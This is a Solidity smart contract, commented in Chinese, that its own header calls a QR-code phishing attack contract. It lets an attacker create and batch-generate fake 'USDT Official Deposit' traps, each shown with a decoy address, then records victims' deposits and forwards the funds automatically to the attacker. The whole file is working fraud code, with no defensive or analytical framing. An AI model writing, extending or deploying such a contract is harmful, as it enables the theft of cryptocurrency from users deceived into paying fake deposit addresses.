// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title QRCodeAttack
 * @notice QR码钓鱼攻击合约
 * @dev 与前端QR生成配合，诱导用户扫描恶意地址
 */
contract QRCodeAttack {
    address public attacker;

    struct QRTrap {
        string label;
        address fakeAddress;
        address realTarget;
        uint256 expectedAmount;
        bool active;
    }

    mapping(bytes32 => QRTrap) public traps;
    mapping(address => uint256) public victimDonations;

    event QRGenerated(bytes32 indexed id, string label, address fakeAddr);
    event FundsRedirected(address indexed victim, uint256 amount);

    constructor() {
        attacker = msg.sender;
    }

    /**
     * @notice 创建QR陷阱
     * @param id 陷阱ID
     * @param label 显示标签（如"USDT充值"）
     * @param fakeAddress 显示的假地址
     * @param realTarget 资金实际流向
     * @param expectedAmount 期望金额
     */
    function createQRTrap(
        bytes32 id,
        string calldata label,
        address fakeAddress,
        address realTarget,
        uint256 expectedAmount
    ) external {
        require(msg.sender == attacker, "Not attacker");
        traps[id] = QRTrap(label, fakeAddress, realTarget, expectedAmount, true);
        emit QRGenerated(id, label, fakeAddress);
    }

    /**
     * @notice 记录通过QR码转入的资金
     */
    function recordQRDeposit(bytes32 trapId) external payable {
        QRTrap storage trap = traps[trapId];
        require(trap.active, "Trap not active");

        victimDonations[msg.sender] += msg.value;

        // 自动转发到攻击者地址
        (bool success, ) = trap.realTarget.call{value: msg.value}("");
        require(success, "Forward failed");

        emit FundsRedirected(msg.sender, msg.value);
    }

    /**
     * @notice 批量生成USDT充值陷阱
     * @param count 生成数量
     */
    function batchUSDTTraps(uint256 count) external {
        require(msg.sender == attacker, "Not attacker");
        for (uint256 i = 0; i < count; i++) {
            bytes32 id = keccak256(abi.encodePacked("USDT_TRAP_", i, block.timestamp));
            traps[id] = QRTrap(
                "USDT Official Deposit",
                address(uint160(uint256(keccak256(abi.encodePacked(i, block.timestamp))))),
                attacker,
                1000 * 10**6,
                true
            );
            emit QRGenerated(id, "USDT Official Deposit", traps[id].fakeAddress);
        }
    }

    function getTrap(bytes32 id) external view returns (QRTrap memory) {
        return traps[id];
    }
}
